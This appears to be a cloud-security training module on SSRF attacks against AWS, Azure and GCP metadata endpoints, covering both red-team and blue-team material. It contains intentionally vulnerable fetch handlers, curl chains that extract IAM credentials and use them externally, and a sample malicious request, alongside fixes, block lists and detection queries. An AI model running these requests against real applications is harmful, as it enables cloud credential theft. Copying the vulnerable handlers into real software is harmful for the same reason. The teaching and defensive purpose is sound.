# 05 — SSRF and Cloud Metadata from App

> **Level:** Advanced
> **Prereqs:** `../Network-Security/ssrf-and-imds-pivots.md`; `../Compute-Container-Security/*`
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Credential Access, Discovery, Collection
> **Authorization scope:** Test SSRF only against your own sandbox application deployed in your own account. Use LocalStack or `imds-localhost` mock for metadata simulation. Never target real production metadata endpoints.

## What & why

Server-Side Request Forgery (SSRF) into the cloud metadata endpoint is the defining cloud-native application vulnerability. When an app makes outbound HTTP requests to user-supplied URLs, an attacker can redirect that request to `169.254.169.254` — the link-local address that serves IAM credentials for the compute resource running the app.

## The OnPrem reality

Internal-only management APIs (e.g., an admin panel on `http://192.168.1.10:8080/admin`) with no authentication. An SSRF against an internal web app could reach these management endpoints, but they typically didn't carry cloud IAM credentials.

## Core concepts

### The metadata endpoint surface

| Attribute | AWS | Azure | GCP |
|---|---|---|---|
| IP address | `169.254.169.254` | `169.254.169.254` | `169.254.169.254` (or `metadata.google.internal`) |
| Protocol | HTTP (IMDSv1) / HTTP+token (IMDSv2) | HTTP with required `Metadata: true` header | HTTP with required `Metadata-Flavor: Google` header |
| Credential path | `/latest/meta-data/iam/security-credentials/<rolename>` | `/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/` | `/computeMetadata/v1/instance/service-accounts/default/token` |
| IAM credentials | AccessKeyId + SecretAccessKey + Token (STS) | OAuth 2.0 access token (JWT) | OAuth 2.0 access token |
| Required header (v2) | `X-aws-ec2-metadata-token: <TOKEN>` (PUT to get token) | `Metadata: true` | `Metadata-Flavor: Google` |
| Compromise impact | STS temporary credentials for the EC2/ECS/Lambda role | Managed identity token → call Azure Resource Manager | Service account token → call GCP APIs |

### Critical IMDS facts (review from 01-09)

| Fact | AWS | Azure | GCP |
|---|---|---|---|
| IPv6 alternative | `fd00:ec2::254` | None | None |
| Can block at hypervisor? | No (link-local is host-only) | No | No |
| Can require token (v2)? | Yes: `HttpTokens=required` on launch template | Yes: always requires `Metadata: true` header | Yes: always requires `Metadata-Flavor: Google` header |
| Lambda metadata path | Via env var `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (no IMDS) | Via env var `IDENTITY_ENDPOINT` | Via metadata server (same address) |

### Why SSRF → metadata works

The app runs on a compute resource (EC2, Cloud Run, Container Apps). That compute has an identity (IAM role, managed identity, service account). Inbound HTTP to the app may be filtered by WAF/API Gateway/load balancer. But *outbound* HTTP from the app, initiated by code, goes directly. If the app calls `requests.get(user_supplied_url)` without validation, that request can target `169.254.169.254` — skipping all inbound controls.

## AWS

### Vulnerable app (Flask — Python)

```python
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    # VULNERABLE: no URL validation
    resp = requests.get(url, timeout=5)
    return resp.text[:200]

# Attacker: http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/
```

### Exploitation chain (IMDSv1)

```bash
# Step 1: Discover the role name
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 2: Retrieve full credentials
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"

# Returns:
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2026-06-22T..."
# }

# Step 3: Use the creds externally
# export AWS_ACCESS_KEY_ID=ASIA...
# export AWS_SECRET_ACCESS_KEY=...
# export AWS_SESSION_TOKEN=...
# aws sts get-caller-identity
# aws s3 ls
```

### Fix: Allowlist + IMDSv2 enforcement

```python
import requests
from flask import Flask, request
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'https'}
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}

BLOCKED_HOSTS = {
    '169.254.169.254', 'metadata.google.internal',
    'localhost', '127.0.0.1', '::1', '0.0.0.0',
    '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'  # internal ranges
}

import ipaddress
import socket

def is_blocked_hostname(hostname):
    try:
        # Resolve hostname to IP and check against blocked ranges
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        for block in BLOCKED_HOSTS:
            if '/' in block:
                if ip in ipaddress.ip_network(block, strict=False):
                    return True
            elif hostname == block:
                return True
    except Exception:
        return True
    return False

@app.route('/fetch-safe')
def fetch_safe():
    url = request.args.get('url')
    parsed = urlparse(url)

    if parsed.scheme not in ALLOWED_SCHEMES:
        return 'Blocked: scheme not allowed', 403

    if parsed.hostname not in ALLOWED_DOMAINS:
        return 'Blocked: domain not in allowlist', 403

    if is_blocked_hostname(parsed.hostname):
        return 'Blocked: internal host', 403

    resp = requests.get(url, timeout=5)
    return resp.text[:200]
```

## Azure

### Vulnerable Azure Function

```python
import requests
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = req.params.get('url')
    # VULNERABLE
    resp = requests.get(url, timeout=5)
    return func.HttpResponse(resp.text[:200])
```

### Attacker's query

```bash
# Get access token for the managed identity
curl "https://example.azurewebsites.net/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# Returns OAuth2 token — use with Azure Resource Manager
# curl -H "Authorization: Bearer <token>" https://management.azure.com/subscriptions
```

**Note:** Azure always requires `Metadata: true` header. An SSRF via `requests.get()` will NOT include this header, so the metadata endpoint returns `400` by default — UNLESS the app's HTTP client is configured to add it, or the app uses a raw socket connection.

### Fix: Same as AWS — domain allowlist; additionally, don't forward the `Metadata` header

```python
@app.route('/fetch-safe')
def fetch_safe():
    # ... same allowlist check as AWS example
    # Additionally: never forward internal headers
    headers = {k: v for k, v in request.headers.items()
               if not k.lower().startswith('x-') and k.lower() not in {'metadata', 'host'}}
    resp = requests.get(url, headers=headers, timeout=5)
    return resp.text[:200]
```

## GCP

### Vulnerable Cloud Run service

```python
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    resp = requests.get(url, timeout=5)
    return resp.text[:200]
```

### Attacker's query (GCP requires `Metadata-Flavor: Google` header)

```bash
# Same as Azure: default requests.get() won't include this header.
# But if the app uses a proxy or forwards headers, it may be possible.
curl "https://example-service-abc-uc.a.run.app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

### Fix: Same allowlist approach

```python
BLOCKED_HOSTS = {
    '169.254.169.254',
    'metadata.google.internal',  # GCP-specific DNS
    'metadata',                   # short name sometimes resolvable
    # ... other blocked hosts
}
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Metadata endpoint | None (but internal APIs exist) | `169.254.169.254` | `169.254.169.254` | `metadata.google.internal` / `169.254.169.254` |
| Required header | N/A | `X-aws-ec2-metadata-token` (v2) | `Metadata: true` | `Metadata-Flavor: Google` |
| Credential format | N/A | STS vended (access key + secret + token) | JWT access token | JWT access token |
| Protection at HTTP client | N/A | Requests to `169.254.169.254` by DNS may not include token | `requests.get()` won't include `Metadata` header | `requests.get()` won't include `Metadata-Flavor` |
| Fix | Internal API firewall | IMDSv2 required + SCP deny on IMDS from non-VPC | Always required `Metadata` header (already enforced) | Always required `Metadata-Flavor` header (already enforced) |

## 🔴 Red Team view

### Combined SSRF + IMDSv1 credential pull — attack trace

**Scenario:** A Lambda reads event `body` to construct a URL. An attacker sends:

```
POST /render-pdf
Content-Type: application/json

{"template_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"}
```

The Lambda fetches the URL and includes the credentials (accidentally or deliberately) in the rendered PDF.

**CloudTrail evidence pattern:**

| Time (UTC) | Event | Source IP | User Agent |
|---|---|---|---|
| T+0 | `GetCallerIdentity` | 198.51.100.10 (VPC NAT gateway) | `Boto3/1.28.0 Python/3.11` |
| T+1min | `GetCallerIdentity` | **203.0.113.50** (attacker's external IP) | `aws-cli/2.13.0` |
| T+2min | `ListBuckets` | 203.0.113.50 | `aws-cli/2.13.0` |
| T+3min | `GetObject` on `s3://prod-secrets/.env` | 203.0.113.50 | `aws-cli/2.13.0` |

**Anomalies:**
- `GetCallerIdentity` from an IP outside the VPC.
- Rapid API calls immediately after a credential issuance.
- User agent changes from the app's SDK to `aws-cli`.

### Artifacts left:
- Application access log showing the SSRF URL (`/render-pdf` with `template_url=http://169.254.169.254/...`).
- CloudTrail `GetCallerIdentity` from the application's role but from a **new source IP**.
- VPC Flow Logs: outbound traffic to `169.254.169.254:80` from the app subnet (IMDSv1 — HTTP, no token).
- CloudWatch Logs: error stack traces if URL fetch failed, possibly revealing the metadata path.

## 🔵 Blue Team view

### Prevention

| Control | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| IMDSv2 required | `metadata_options { http_tokens = "required" }` in launch template | Always enforced (Metadata header) | Always enforced (Metadata-Flavor header) | N/A |
| SCP deny non-VPC IMDS access | `Deny ec2:RunInstances unless HttpTokens=required` | N/A | N/A | N/A |
| App-level URL allowlist | Validate scheme (https only), domain (explicit list) | Same | Same | Same |
| Network-level block | VPC endpoint policies with `aws:SourceVpc` | Network security group deny to `169.254.169.254` | VPC firewall rule deny to metadata | Internal firewall |
| Minimal IAM role permissions | Scope to specific S3 prefixes, DynamoDB tables | Scope to specific resource groups | Scope to specific resources with conditions | N/A |
| Block `169.254.169.254` at OS | `iptables -A OUTPUT -d 169.254.169.254 -j DROP` (Docker/Container) | Same (Container Apps don't need IMDS access) | Same (Cloud Run may need metadata for ADC, so test first) | N/A |

### CloudTrail / Activity Log detection

**AWS CloudTrail — credential used from external IP:**

```sql
-- Athena / CloudTrail Lake query
SELECT eventTime, eventName, sourceIPAddress, userAgent, userIdentity.arn
FROM cloudtrail_logs
WHERE userIdentity.arn LIKE '%:role/app-role'
  AND sourceIPAddress NOT IN (
    SELECT DISTINCT sourceIPAddress
    FROM cloudtrail_logs
    WHERE userIdentity.arn LIKE '%:role/app-role'
      AND eventTime >= date_add('day', -7, current_timestamp)
    GROUP BY sourceIPAddress
    HAVING count(*) > 100
  )
  AND eventTime >= date_add('hour', -1, current_timestamp)
ORDER BY eventTime DESC
```

**Azure — Managed Identity token used from unexpected location:**

```kql
// Log Analytics / Sentinel
IdentityLogonEvents
| where Identity == "app-function-mi"
| where TimeGenerated > ago(1h)
| where IPAddress !in (known_app_ips)
| project TimeGenerated, IPAddress, Resource, OperationName
```

**GCP — Service account key used from external IP:**

```sql
-- BigQuery / Cloud Logging
SELECT timestamp, protopayload_auditlog.authenticationInfo.principalEmail,
       protopayload_auditlog.requestMetadata.callerIp
FROM `example-project.logs.cloudaudit_googleapis_com_activity`
WHERE protopayload_auditlog.authenticationInfo.principalEmail LIKE '%app-sa@%'
  AND protopayload_auditlog.requestMetadata.callerIp NOT IN (
    '10.0.0.0/8', '35.0.0.0/8' -- your ranges
  )
  AND timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
```

### Key policy with `aws:SourceVpce`

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": { "AWS": "arn:aws:iam::111111111111:role/app-role" },
      "Action": "s3:*",
      "Resource": "arn:aws:s3:::prod-*/*",
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpce": "vpce-0a1b2c3d4e5f67890"
        }
      }
    }
  ]
}
```

This ensures even if the role credentials leak, they cannot be used from outside the VPC endpoint.

## Hands-on lab

See [`labs/ssrf-to-imds-lab.md`](labs/ssrf-to-imds-lab.md) — a full walkthrough with a local Flask app, LocalStack mock of IMDSv1, exploitation, and fix.

## Detection rules

See [`detections/ssrf-metadata-detection.md`](detections/ssrf-metadata-detection.md) — Sigma-style detection rules for credential usage from outside the VPC.

## References

- AWS IMDS documentation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- Azure Instance Metadata Service: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- GCP VM metadata: https://cloud.google.com/compute/docs/metadata
- OWASP SSRF Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- Cross-ref: `../Network-Security/ssrf-and-imds-pivots.md` for network-level IMDS defense.
- Cross-ref: `iam-from-application-context.md` for app-level IAM forwarding risks.
